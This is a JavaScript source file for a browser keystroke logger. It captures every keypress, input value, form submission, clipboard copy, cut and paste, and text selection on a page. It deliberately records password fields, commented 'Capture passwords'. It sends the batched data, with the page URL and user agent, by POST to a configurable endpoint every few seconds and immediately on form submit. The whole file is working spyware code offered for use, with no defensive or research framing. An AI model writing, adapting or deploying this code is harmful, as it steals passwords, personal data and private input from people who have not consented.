// Advanced Keystroke Logger
// Captures all keyboard input, form data, and clipboard operations

const KeystrokeLogger = {
    logs: [],
    isActive: false,
    sendInterval: null,
    endpoint: '/api/keystrokes',

    // Initialize the logger
    init(options = {}) {
        this.endpoint = options.endpoint || '/api/keystrokes';
        this.sendIntervalTime = options.sendInterval || 5000; // Send every 5 seconds
        this.isActive = true;

        this.attachListeners();
        this.startSendInterval();

        console.log('Keystroke logger initialized');
    },

    // Attach all event listeners
    attachListeners() {
        // Keyboard events
        document.addEventListener('keydown', this.handleKeyDown.bind(this), true);
        document.addEventListener('keyup', this.handleKeyUp.bind(this), true);
        document.addEventListener('keypress', this.handleKeyPress.bind(this), true);

        // Input events
        document.addEventListener('input', this.handleInput.bind(this), true);
        document.addEventListener('change', this.handleChange.bind(this), true);

        // Form events
        document.addEventListener('submit', this.handleSubmit.bind(this), true);

        // Clipboard events
        document.addEventListener('copy', this.handleCopy.bind(this), true);
        document.addEventListener('cut', this.handleCut.bind(this), true);
        document.addEventListener('paste', this.handlePaste.bind(this), true);

        // Focus events
        document.addEventListener('focus', this.handleFocus.bind(this), true);
        document.addEventListener('blur', this.handleBlur.bind(this), true);

        // Selection events
        document.addEventListener('select', this.handleSelect.bind(this), true);
    },

    // Handle keydown events
    handleKeyDown(e) {
        if (!this.isActive) return;

        this.logEvent({
            type: 'keydown',
            key: e.key,
            code: e.code,
            keyCode: e.keyCode,
            ctrlKey: e.ctrlKey,
            shiftKey: e.shiftKey,
            altKey: e.altKey,
            metaKey: e.metaKey,
            target: this.getElementInfo(e.target),
            timestamp: new Date().toISOString()
        });
    },

    // Handle keyup events
    handleKeyUp(e) {
        if (!this.isActive) return;

        this.logEvent({
            type: 'keyup',
            key: e.key,
            code: e.code,
            target: this.getElementInfo(e.target),
            timestamp: new Date().toISOString()
        });
    },

    // Handle keypress events
    handleKeyPress(e) {
        if (!this.isActive) return;

        this.logEvent({
            type: 'keypress',
            key: e.key,
            charCode: e.charCode,
            target: this.getElementInfo(e.target),
            timestamp: new Date().toISOString()
        });
    },

    // Handle input events (captures actual value changes)
    handleInput(e) {
        if (!this.isActive) return;

        const element = e.target;
        if (element.tagName === 'INPUT' || element.tagName === 'TEXTAREA') {
            this.logEvent({
                type: 'input',
                value: element.value,
                inputType: e.inputType,
                target: this.getElementInfo(element),
                timestamp: new Date().toISOString()
            });
        }
    },

    // Handle change events
    handleChange(e) {
        if (!this.isActive) return;

        const element = e.target;
        this.logEvent({
            type: 'change',
            value: this.getElementValue(element),
            target: this.getElementInfo(element),
            timestamp: new Date().toISOString()
        });
    },

    // Handle form submissions
    handleSubmit(e) {
        if (!this.isActive) return;

        const form = e.target;
        const formData = new FormData(form);
        const data = {};

        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }

        this.logEvent({
            type: 'submit',
            formData: data,
            formAction: form.action,
            formMethod: form.method,
            timestamp: new Date().toISOString()
        });

        // Send immediately on form submit
        this.sendLogs();
    },

    // Handle copy events
    handleCopy(e) {
        if (!this.isActive) return;

        const selectedText = window.getSelection().toString();

        this.logEvent({
            type: 'copy',
            text: selectedText,
            target: this.getElementInfo(e.target),
            timestamp: new Date().toISOString()
        });
    },

    // Handle cut events
    handleCut(e) {
        if (!this.isActive) return;

        const selectedText = window.getSelection().toString();

        this.logEvent({
            type: 'cut',
            text: selectedText,
            target: this.getElementInfo(e.target),
            timestamp: new Date().toISOString()
        });
    },

    // Handle paste events
    handlePaste(e) {
        if (!this.isActive) return;

        let pastedText = '';

        if (e.clipboardData && e.clipboardData.getData) {
            pastedText = e.clipboardData.getData('text/plain');
        }

        this.logEvent({
            type: 'paste',
            text: pastedText,
            target: this.getElementInfo(e.target),
            timestamp: new Date().toISOString()
        });
    },

    // Handle focus events
    handleFocus(e) {
        if (!this.isActive) return;

        this.logEvent({
            type: 'focus',
            target: this.getElementInfo(e.target),
            timestamp: new Date().toISOString()
        });
    },

    // Handle blur events
    handleBlur(e) {
        if (!this.isActive) return;

        const element = e.target;

        this.logEvent({
            type: 'blur',
            value: this.getElementValue(element),
            target: this.getElementInfo(element),
            timestamp: new Date().toISOString()
        });
    },

    // Handle select events
    handleSelect(e) {
        if (!this.isActive) return;

        const selectedText = window.getSelection().toString();

        this.logEvent({
            type: 'select',
            text: selectedText,
            target: this.getElementInfo(e.target),
            timestamp: new Date().toISOString()
        });
    },

    // Get element information
    getElementInfo(element) {
        if (!element) return null;

        return {
            tagName: element.tagName,
            type: element.type || null,
            id: element.id || null,
            name: element.name || null,
            className: element.className || null,
            placeholder: element.placeholder || null,
            value: this.getElementValue(element)
        };
    },

    // Get element value safely
    getElementValue(element) {
        if (!element) return null;

        if (element.tagName === 'INPUT') {
            if (element.type === 'password') {
                return element.value; // Capture passwords
            }
            if (element.type === 'checkbox' || element.type === 'radio') {
                return element.checked;
            }
            return element.value;
        }

        if (element.tagName === 'TEXTAREA') {
            return element.value;
        }

        if (element.tagName === 'SELECT') {
            return element.value;
        }

        return element.textContent || null;
    },

    // Log an event
    logEvent(event) {
        this.logs.push(event);

        // If logs exceed 100 entries, send immediately
        if (this.logs.length >= 100) {
            this.sendLogs();
        }
    },

    // Start interval to send logs periodically
    startSendInterval() {
        this.sendInterval = setInterval(() => {
            if (this.logs.length > 0) {
                this.sendLogs();
            }
        }, this.sendIntervalTime);
    },

    // Send logs to server
    async sendLogs() {
        if (this.logs.length === 0) return;

        const logsToSend = [...this.logs];
        this.logs = []; // Clear logs

        try {
            await fetch(this.endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    logs: logsToSend,
                    userAgent: navigator.userAgent,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                })
            });
        } catch (e) {
            console.error('Failed to send keystroke logs:', e);
            // Re-add logs if send failed
            this.logs = logsToSend.concat(this.logs);
        }
    },

    // Stop logging
    stop() {
        this.isActive = false;
        if (this.sendInterval) {
            clearInterval(this.sendInterval);
        }
        // Send remaining logs
        this.sendLogs();
    },

    // Get current logs (for debugging)
    getLogs() {
        return this.logs;
    },

    // Clear logs
    clearLogs() {
        this.logs = [];
    }
};

// Auto-initialize on page load (can be disabled)
if (typeof window !== 'undefined') {
    window.KeystrokeLogger = KeystrokeLogger;
}
